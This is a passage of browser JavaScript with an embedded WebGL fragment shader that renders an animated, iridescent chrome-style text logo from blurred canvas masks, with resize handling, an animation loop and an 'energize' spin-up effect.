        '  ribbon = mix(ribbon, vec3(0.16, 0.3, 0.95), smoothstep(0.82, 0.96, u));',
        '  float darkSeam = smoothstep(0.82, 0.97, sin(h * 30.0 - t * 0.07));',
        '  ribbon *= (1.0 - darkSeam * 0.8);',
        '  ribbon *= 0.88 + 0.12 * sin(h * 64.0 + q.x * 6.0 - t * 0.15);',
        '  float patch = smoothstep(0.2, 0.8, 0.5 + 0.5 * sin(q.x * 3.0 + 1.5 * sin(q.y * 2.0 + t * 0.08) + t * 0.05));',
        '  float ribbonAmt = clamp(acc * (0.45 + 0.55 * patch) * smoothstep(0.05, 0.28, h) * 0.9, 0.0, 0.9);',
        '  col = mix(col, ribbon, ribbonAmt);',
        '  float edgeLine = exp(-pow((h - 0.24) * 40.0, 2.0)) * acc;',
        '  col *= 1.0 - edgeLine * 0.7;',
        '  float poolGate = clamp(smoothstep(0.55, 0.35, vUv.y) * leftBias * 1.2, 0.0, 1.0) * uIri;',
        '  float pool = smoothstep(0.76, 0.84, h) * poolGate;',
        '  col = mix(col, vec3(0.02, 0.02, 0.03), pool * 0.96);',
        '  float rimBand = exp(-pow((h - 0.80) * 30.0, 2.0)) * poolGate;',
        '  col += vec3(1.05, 0.85, 0.55) * rimBand * 0.5;',
        '  col = pow(max(col, 0.0), vec3(0.9));',
        '  float alpha = smoothstep(0.40, 0.58, texture2D(uSharp, vUv).r);',
        '  float glow = texture2D(uGlow, vUv).r;',
        '  vec3 outCol = col * alpha + vec3(0.55, 0.6, 0.7) * glow * glow * 0.08 * (1.0 - alpha);',
        '  float g = fract(sin(dot(gl_FragCoord.xy + mod(t, 10.0) * 37.0, vec2(12.9898, 78.233))) * 43758.5453);',
        '  outCol += (g - 0.5) * 0.015;',
        '  gl_FragColor = vec4(outCol, 1.0);',
        '}'
    ].join('\n');

    function mk(type, src) {
        var s = gl.createShader(type);
        gl.shaderSource(s, src);
        gl.compileShader(s);
        if (!gl.getShaderParameter(s, gl.COMPILE_STATUS)) console.error('shader error', gl.getShaderInfoLog(s));
        return s;
    }
    var prog = gl.createProgram();
    gl.attachShader(prog, mk(gl.VERTEX_SHADER, vsSrc));
    gl.attachShader(prog, mk(gl.FRAGMENT_SHADER, fsSrc));
    gl.linkProgram(prog);
    if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) console.error('link error', gl.getProgramInfoLog(prog));
    gl.useProgram(prog);

    var buf = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
    var loc = gl.getAttribLocation(prog, 'aPos');
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);

    var u = {};
    ['uHeight', 'uSharp', 'uGlow', 'uRes', 'uTime', 'uSpeed', 'uIri', 'uNs', 'uOff'].forEach(function (name) {
        u[name] = gl.getUniformLocation(prog, name);
    });
    gl.pixelStorei(gl.UNPACK_FLIP_Y_WEBGL, true);
    gl.clearColor(0, 0, 0, 1);
    var tex = [0, 1, 2].map(function () {
        var tx = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tx);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
        return tx;
    });
    gl.uniform1i(u.uHeight, 0);
    gl.uniform1i(u.uSharp, 1);
    gl.uniform1i(u.uGlow, 2);

    function buildMask() {
        if (!W) return;
        function mkCanvas() { var cv = document.createElement('canvas'); cv.width = W; cv.height = H; return cv; }
        var base = mkCanvas();
        var bx = base.getContext('2d');
        bx.fillStyle = '#000'; bx.fillRect(0, 0, W, H);
        var fs = H * 0.32;
        function setFont() { bx.font = "400 " + fs + "px 'Comfortaa', sans-serif"; try { bx.letterSpacing = (fs * 0.02) + 'px'; } catch (e) {} }
        setFont();
        var stretch = 1.08;
        function fatten() { return fs * 0.10; }
        var tw = (bx.measureText(text).width + fatten()) * stretch;
        var maxW = W * 0.58;
        if (tw > maxW) { fs *= maxW / tw; setFont(); }
        bx.fillStyle = '#fff'; bx.strokeStyle = '#fff'; bx.lineJoin = 'round'; bx.lineCap = 'round';
        bx.lineWidth = fatten(); bx.textAlign = 'center'; bx.textBaseline = 'middle';
        bx.setTransform(stretch, 0, 0, 1, W / 2, H / 2);
        bx.strokeText(text, 0, fs * 0.05);
        bx.fillText(text, 0, fs * 0.05);
        bx.setTransform(1, 0, 0, 1, 0, 0);
        function blurTo(r) {
            var cv = mkCanvas(); var cx = cv.getContext('2d');
            cx.fillStyle = '#000'; cx.fillRect(0, 0, W, H);
            cx.filter = 'blur(' + r + 'px)'; cx.drawImage(base, 0, 0);
            return cv;
        }
        var blurR = Math.max(4, fs * 0.085);
        var height = blurTo(blurR);
        var sharp = blurTo(1.2);
        var glow = blurTo(Math.max(14, fs * 0.26));
        doff = Math.max(2, blurR * 0.5);
        ns = (blurR * 3.0) / doff;
        [height, sharp, glow].forEach(function (cv, i) {
            gl.activeTexture(gl.TEXTURE0 + i);
            gl.bindTexture(gl.TEXTURE_2D, tex[i]);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, cv);
        });
        maskReady = true;
        draw(performance.now());
    }

    function resize() {
        if (!canvas || !gl) return;
        var dpr = Math.min(window.devicePixelRatio || 1, 2);
        var w = Math.round(canvas.clientWidth * dpr);
        var h = Math.round(canvas.clientHeight * dpr);
        if (!w || !h) return;
        canvas.width = w; canvas.height = h; W = w; H = h;
        gl.viewport(0, 0, w, h);
        buildMask();
    }

    function draw(now) {
        if (!gl || gl.isContextLost()) return;
        if (!t0) t0 = now;
        if (!maskReady) { resize(); if (!maskReady) return; }
        var sp = speed, ir = iridescence;
        if (energizeStart) {
            var k = Math.min((now - energizeStart) / 700, 1); // 0..1 over 0.7s
            sp = speed * (1 + k * 4.5);       // spin up
            ir = iridescence * (1 + k * 1.4); // oil-slick intensifies
        }
        gl.uniform2f(u.uRes, W, H);
        gl.uniform1f(u.uTime, (now - t0) / 1000);
        gl.uniform1f(u.uSpeed, sp);
        gl.uniform1f(u.uIri, ir);
        gl.uniform1f(u.uNs, ns || 30);
        gl.uniform1f(u.uOff, doff || 2);
        gl.drawArrays(gl.TRIANGLES, 0, 3);
    }

    canvas.addEventListener('webglcontextlost', function (e) { e.preventDefault(); maskReady = false; });
    canvas.addEventListener('webglcontextrestored', function () { resize(); });
    var onResize = function () { resize(); };
    window.addEventListener('resize', onResize);
    resize();
    if (document.fonts) {
        try { document.fonts.load('400 120px Comfortaa').then(buildMask).catch(function () {}); } catch (e) {}
        try { document.fonts.ready.then(buildMask); } catch (e) {}
    }

    var raf = 0;
    function step(now) {
        if (disposed) return;
        try { draw(now); } catch (e) { console.error('[chrome-logo] draw', e); }
        raf = requestAnimationFrame(step);
    }
    step(performance.now());

    return {
        dispose: function () {
            disposed = true;
            if (raf) cancelAnimationFrame(raf);
            if (tmr) clearTimeout(tmr);
            window.removeEventListener('resize', onResize);
        },
        energize: function () { energizeStart = performance.now(); }
    };
}
